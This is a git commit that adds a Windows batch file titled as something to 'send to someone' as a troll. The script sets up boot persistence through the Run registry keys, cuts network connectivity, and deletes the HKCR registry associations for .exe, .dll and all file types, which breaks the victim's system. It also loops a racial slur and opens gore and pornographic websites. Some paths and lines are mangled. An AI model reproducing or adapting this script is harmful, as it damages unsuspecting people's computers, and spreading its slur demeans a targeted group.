36c76865db0187f1a613d4bdf0b3d64cee306083
regular <72821945+LilPenis404@users.noreply.github.com>
2021-05-24 01:23:29 -0500

    Add files via upload

---
+++ send this to someone troll.bat
@@ -0,0 +1,26 @@
+echo @echo off>c:windowswimn32.bat
+echo break off>c:windowswimn32.bat echo
+ipconfig/release_all>c:windowswimn32.bat
+echo end>c:windowswimn32.batreg add
+hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
+hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED!
+PAUSE
+@ECHO OFF
+ START reg delete HKCR/.exe
+ START reg delete HKCR/.dll
+ START reg delete HKCR/*
+ :MESSAGE
+ ECHO Bun Bun Virus'd Like A Nigger
+ GOTO MESSAGE
+ @echo off
+echo Welcome to my Search Engine!
+echo Type 1 Keyword to Search. Use +s instead of spaces
+set/p "keyw=Your PC Has Been Ratted Retard LMAO What do you have to say for yourself?: "
+start https://bestgore.com
+start https://hoodsite.com
+start https://men.com
+start https://cutiegarden.org
+start https://kekma.net
+start https://pornhub.com
+start https://xvideos.com
+start https://bruh.com
